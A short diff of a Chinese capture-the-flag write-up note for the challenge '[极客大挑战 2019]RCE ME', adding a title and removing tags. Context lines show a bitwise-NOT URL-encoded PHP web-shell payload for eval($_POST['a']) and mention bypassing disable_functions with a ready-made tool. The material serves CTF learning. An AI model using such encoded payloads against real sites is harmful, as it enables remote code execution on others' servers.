@@ -1,3 +1,4 @@
+# [极客大挑战 2019]RCE ME
 ![](<./img/Pasted image 20221221195120.png>)
 
 ---
@@ -72,5 +73,3 @@ eval($_POST['a']) ==> %9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%d8%9e%d8%a2%d6
 直接用轮子绕过`disable_functions`（嗯，绝对不是`LD_PRELOAD`搞不来～）
 
 ![](<./img/Pasted image 20221222120344.png>)
-
-#Web #PHP #bypass #encoding #RCE #disable_functions #antsword
